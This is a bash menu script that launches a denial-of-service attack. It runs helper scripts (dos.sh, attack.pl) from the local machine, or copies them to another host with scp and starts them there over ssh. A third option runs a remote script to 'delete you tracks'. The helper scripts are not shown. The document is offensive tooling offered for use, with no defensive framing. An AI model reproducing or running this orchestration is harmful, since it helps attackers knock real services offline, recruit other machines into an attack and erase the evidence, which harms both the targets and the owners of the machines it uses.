#! /bin/bash
chmod 777 dos.sh
chmod 777 attack.pl
chmod 777 remove.sh
echo "------------------------------------------------------------"
echo "             Welcome lets DDos  "
echo "------------------------------------------------------------"
echo -e "\n"
echo "Select an option from below:"
echo "1) Dos using this machine"
echo "2) Dos using  other machines"
echo "3) Delete you tracks"
echo "4)exit"
read option

while :
do
case $option in
		1)echo "Ok, Lets attack using this Machine!!"
		  echo "rember stop the attack using ctr+z"
		  ./dos.sh
		 ;;
			

		2)echo "lets attack using another machine!!!"
		  echo "Enter ip:"
		  read a
		
		  echo "Enter hostname:"
		  read h1
		  scp dos.sh $h1@$a:~
		  scp attack.pl $h1@$a:~
 
		  ssh $a './dos.sh'
		  echo "ending attack"
		 ;;
		3)
		  echo "Enter ip:"
		  read a
		  echo "Enter hostname:"
		  read h1
		  scp remove.sh $h1@$a:~
		  ssh $a './remove.sh'
		  echo "we are back to normal"
		  exit 0 ;;
		4)exit 0
		;;
		esac
 
done

